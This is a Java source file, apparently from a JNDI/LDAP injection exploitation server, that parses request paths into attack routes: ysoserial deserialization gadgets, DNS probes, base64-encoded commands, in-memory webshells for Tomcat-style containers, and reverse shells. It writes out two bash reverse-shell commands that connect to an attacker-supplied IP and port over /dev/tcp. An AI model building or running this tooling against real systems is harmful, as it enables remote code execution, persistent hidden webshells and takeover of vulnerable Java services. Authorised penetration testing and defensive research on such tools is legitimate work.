package com.bloom.parser;

import com.bloom.util.Functions;
import java.util.Base64;

public class RouteParser {

    // 已知的动作方法关键字。只有 parts[1] 命中这些时才当作 method 段，
    // 否则 parts[1] 是命令/参数本身（如 basic/open -a calculator），method 留空。
    private static boolean isMethodKeyword(String segment) {
        switch (segment) {
            case "base64":
            case "reverseshell":
            case "reverseshell2":
            case "memshell":
                return true;
            default:
                return false;
        }
    }

    public ParsedRoute parse(String baseDN) {
        if (baseDN == null || baseDN.isEmpty()) {
            return ParsedRoute.builder()
                    .rawBaseDN(baseDN)
                    .addError("baseDN 为空")
                    .build();
        }

        String[] parts = baseDN.split("/");
        if (parts.length < 2) {
            return ParsedRoute.builder()
                    .rawBaseDN(baseDN)
                    .addError("路径格式不正确，至少需要两段")
                    .build();
        }

        String firstSegment = parts[0].toLowerCase();

        if (firstSegment.equals("basic")) {
            return parseBasic(baseDN, parts);
        } else if (firstSegment.equals("fuzz")) {
            return parseFuzz(baseDN, parts);
        } else if (firstSegment.equals("fuzzbydns")) {
            return parseFuzzByDNS(baseDN, parts);
        } else {
            return parseGadget(baseDN, parts);
        }
    }

    private ParsedRoute parseBasic(String baseDN, String[] parts) {
        if (parts.length < 2) {
            return ParsedRoute.builder()
                    .routeType(RouteType.BASIC)
                    .rawBaseDN(baseDN)
                    .addError("basic 路径格式不正确")
                    .build();
        }

        // parts[1] 命中动作关键字才是 method；否则它是命令本身，method 留空。
        String candidate = parts[1].toLowerCase();
        String method = isMethodKeyword(candidate) ? candidate : "";

        ParsedRoute.Builder builder = ParsedRoute.builder()
                .routeType(RouteType.BASIC)
                .payloadType("basic")
                .method(method)
                .rawBaseDN(baseDN);

        String command = extractCommand(baseDN, method, builder);
        if (method.equals("memshell")) {
            validateBasicMemshellName(command, builder);
        }
        builder.command(command)
                .actionType(classifyBasicAction(method, command));
        return builder.build();
    }

    // basic 路由 memshell 名存在性校验：非法名在 dry-run / 服务端日志直接失败，
    // 不再投递到目标端才 ClassNotFoundException 静默失败（#9）。
    // 只覆盖 CLASS: 形态，FILE: 缺失文件由服务端/HTTP 侧明确报错；
    // gadget 路由的 memshell 名是自由文本（如 EL/memshell/tomcatmemshell1），不在此校验。
    private void validateBasicMemshellName(String command, ParsedRoute.Builder builder) {
        if (!command.startsWith("CLASS:")) {
            return;
        }
        String name = command.substring(6);
        try {
            // 不触发 <clinit>：memshell 模板静态块依赖目标容器类加载器，本机执行必炸
            Class.forName("ysoserial.payloads.templates." + name, false, RouteParser.class.getClassLoader());
        } catch (ClassNotFoundException ex) {
            builder.addError("无该内存马类型: " + name);
        }
    }

    private ParsedRoute parseFuzz(String baseDN, String[] parts) {
        if (parts.length < 3) {
            return ParsedRoute.builder()
                    .routeType(RouteType.FUZZ)
                    .rawBaseDN(baseDN)
                    .addError("fuzz 路径格式不正确，需要 fuzz/[GadgetType]/[domain]")
                    .build();
        }

        String payloadType = parts[1];
        String domain = parts[2];

        return ParsedRoute.builder()
                .routeType(RouteType.FUZZ)
                .payloadType(payloadType)
                .method("fuzz")
                .command(domain)
                .actionType(ActionType.DNS_PROBE)
                .rawBaseDN(baseDN)
                .build();
    }

    private ParsedRoute parseFuzzByDNS(String baseDN, String[] parts) {
        if (parts.length < 2) {
            return ParsedRoute.builder()
                    .routeType(RouteType.FUZZ_BY_DNS)
                    .rawBaseDN(baseDN)
                    .addError("fuzzbyDNS 路径格式不正确，需要 fuzzbyDNS/[domain]")
                    .build();
        }

        String domain = parts[1];

        return ParsedRoute.builder()
                .routeType(RouteType.FUZZ_BY_DNS)
                .payloadType("FindGadgetByDNS")
                .method("fuzzbyDNS")
                .command(domain)
                .actionType(ActionType.DNS_PROBE)
                .rawBaseDN(baseDN)
                .build();
    }

    private ParsedRoute parseGadget(String baseDN, String[] parts) {
        String payloadType = parts[0];
        // parts[1] 命中动作关键字才是 method；否则它是命令/域名本身，method 留空。
        String candidate = parts.length > 1 ? parts[1].toLowerCase() : "";
        String method = isMethodKeyword(candidate) ? candidate : "";

        ParsedRoute.Builder builder = ParsedRoute.builder()
                .routeType(RouteType.GADGET)
                .payloadType(payloadType)
                .method(method)
                .rawBaseDN(baseDN);

        String command = extractCommand(baseDN, method, builder);
        builder.command(command)
                .actionType(classifyGadgetAction(method, command, payloadType));
        return builder.build();
    }

    // 解析命令段。reverse shell 在此校验 IP/port，非法参数通过 builder.addError 记录，
    // 使 ParsedRoute.isValid() 返回 false，让非法 payload 在发送前失败。
    private String extractCommand(String baseDN, String method, ParsedRoute.Builder builder) {
        switch (method) {
            case "base64":
                String[] parts = baseDN.split("/");
                if (parts.length >= 3) {
                    try {
                        return new String(Base64.getDecoder().decode(parts[2]));
                    } catch (IllegalArgumentException ex) {
                        builder.addError("base64 参数解码失败");
                        return "";
                    }
                }
                builder.addError("base64 路径缺少编码参数");
                return "";
            case "reverseshell":
            case "reverseshell2":
                parts = baseDN.split("/");
                if (parts.length < 4) {
                    builder.addError("reverseshell 路径格式不正确，需要 [ip]/[port]");
                    return "";
                }
                String ip = parts[2];
                String port = parts[3];
                if (!Functions.ipCheck(ip)) {
                    builder.addError("非法 IP: " + ip);
                    return "";
                }
                if (!isValidPort(port)) {
                    builder.addError("非法端口: " + port);
                    return "";
                }
                if (method.equals("reverseshell")) {
                    return "/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
                } else {
                    return "bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
                }
            case "memshell":
                String memshellPart = baseDN.substring(baseDN.indexOf("/memshell/") + 10);
                if (memshellPart.startsWith("FILE:")) {
                    return memshellPart;
                } else if (memshellPart.startsWith("GEN:")) {
                    return memshellPart;
                } else {
                    return "CLASS:" + memshellPart;
                }
            default:
                int firstSlash = baseDN.indexOf("/");
                if (firstSlash >= 0 && firstSlash < baseDN.length() - 1) {
                    return baseDN.substring(firstSlash + 1);
                }
                return baseDN;
        }
    }

    private boolean isValidPort(String port) {
        try {
            int p = Integer.parseInt(port);
            return p >= 1 && p <= 65535;
        } catch (NumberFormatException ex) {
            return false;
        }
    }

    private ActionType classifyBasicAction(String method, String command) {
        if (method.equals("memshell")) {
            return ActionType.MEMSHELL;
        }
        if (method.equals("reverseshell") || method.equals("reverseshell2")) {
            return ActionType.REVERSE_SHELL;
        }
        if (method.equals("base64") || !command.isEmpty()) {
            return ActionType.COMMAND;
        }
        return ActionType.REMOTE_CLASS_LOAD;
    }

    private ActionType classifyGadgetAction(String method, String command, String payloadType) {
        if (payloadType.equalsIgnoreCase("URLDNS") || payloadType.equalsIgnoreCase("fuzzbyDNS")) {
            return ActionType.DNS_PROBE;
        }
        if (method.equals("memshell")) {
            return ActionType.MEMSHELL;
        }
        if (method.equals("reverseshell") || method.equals("reverseshell2")) {
            return ActionType.REVERSE_SHELL;
        }
        if (method.equals("base64")) {
            return ActionType.COMMAND;
        }
        // 无显式 method 的 gadget：parts[1] 是命令则判 COMMAND，否则是序列化 gadget 探测。
        if (!command.isEmpty() && !command.startsWith("http")) {
            return ActionType.COMMAND;
        }
        return ActionType.SERIALIZED_GADGET;
    }
}
